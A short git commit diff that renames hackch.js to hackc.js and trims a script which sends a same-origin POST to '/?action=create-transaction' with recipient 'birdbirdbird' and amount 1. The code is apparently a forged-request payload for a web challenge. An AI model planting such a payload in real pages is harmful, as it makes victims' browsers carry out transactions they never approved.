1cba6f752d8446eba9a0f901fc5b12339563d045
Achuth V P <65720815+retrymp3@users.noreply.github.com>
2025-05-19 13:18:41 +0530

    Update and rename hackch.js to hackc.js

--- hackc.js
+++ hackc.js
@@ -1,9 +1,5 @@
-(async function() {
-  // Create initial small transaction (amount=1)
-  await fetch('/?action=create-transaction', {
+fetch('/?action=create-transaction', {
     method:'POST', 
     body:'recipient=birdbirdbird&amount=1', 
     headers:{'Content-Type':'application/x-www-form-urlencoded'}
   });
-  
-})();
